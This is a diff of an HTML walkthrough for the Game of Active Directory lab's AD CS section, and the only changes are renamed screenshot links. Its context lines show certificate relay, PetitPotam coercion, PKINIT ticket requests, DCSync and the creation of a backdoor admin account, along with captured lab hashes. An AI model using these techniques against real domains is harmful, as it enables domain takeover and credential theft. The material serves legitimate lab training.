@@ -667,7 +667,7 @@ goad (instance)> provision vulnerabilities.yml</code></pre>
 <p>Strategic Use Case:</p>
 <p>We choose the LDAP Shell path when we suspect the defenders are watching for PKINIT (Event 4768) events. Schannel authentication is logged differently and bypasses the Kerberos logic entirely. It effectively gives us a direct "Database Console" for the domain, allowing us to perform tasks like dumping the LAPS passwords or adding ourselves to "Domain Admins" with zero Kerberos traffic on the wire. </p>
 <p>certipy-ad auth -pfx 'administrator.pfx' -ldap-shell -dc-ip '10.4.10.12</p>
-<img src="./game-of-active-directory/part-5-adcs/images/screenshot_31.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_31.jpg" alt="">
 
 
 <p>We are now operating inside the heart of the Active Directory database. Since we utilized the -ldap-shell feature to bypass the standard Kerberos ticket mechanism, we currently hold a direct, encrypted channel to the LDAP service running as the Administrator. Our immediate objective here is to transform our temporary cryptographic access into a permanent administrative account. By creating a dedicated user, we can switch from utilizing specialized certificate tools to using standard administrative protocols like RDP, WinRM, and SMB with a simple username and password. This effectively grants us a "Backdoor Admin" that persists even if the original certificate we forged is revoked or expires.</p>
@@ -933,13 +933,13 @@ SEVENKINGDOMS$:des-cbc-md5:ef3e1a68ab07d50b
 
 <p>ntlmrelayx will relay the authentication to the web enrollment and get the certificate</p>
 
-<img src="./game-of-active-directory/part-5-adcs/images/screenshot_40.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_34.png" alt="">
 
 
 
 <p>Since we already have the Certificate, let’s add it into a file and user gettgtpkinit.py to request the Ticket Granting Ticket.</p>
 <p>gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'</p>
-<img src="./game-of-active-directory/part-5-adcs/images/screenshot_41.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_35.png" alt="">
 
 
 <p>And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.</p>
@@ -991,7 +991,7 @@ SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:a2df9dab576856ef49ffb73cb87c307d
 SEVENKINGDOMS$:des-cbc-md5:e920b3430b1af454</code></pre>
 
 
-<img src="./game-of-active-directory/part-5-adcs/images/screenshot_42.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_36.png" alt="">
 
 
 
@@ -1002,13 +1002,13 @@ SEVENKINGDOMS$:des-cbc-md5:e920b3430b1af454</code></pre>
 <p>Let’s do the same attack with certipy, setup the listener.</p>
 
 <p>sudo certipy relay -target 10.4.10.23 -template DomainController</p>
-<img src="./game-of-active-directory/part-5-adcs/images/screenshot_43.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_37.png" alt="">
 
 
 
 <p>Now we trig the coerce.</p>
 <p>python3 PetitPotam.py 10.4.10.1 meereen.essos.local</p>
-<img src="./game-of-active-directory/part-5-adcs/images/screenshot_44.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_38.png" alt="">
 
 
 
@@ -1024,7 +1024,7 @@ SEVENKINGDOMS$:des-cbc-md5:e920b3430b1af454</code></pre>
 [*] Got hash for 'meereen$@essos.local': aad3b435b51404eeaad3b435b51404ee:1658546257058b9db06169b70bd26fdb</code></pre>
 
 
-<img src="./game-of-active-directory/part-5-adcs/images/screenshot_45.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_39.png" alt="">
 
 
 
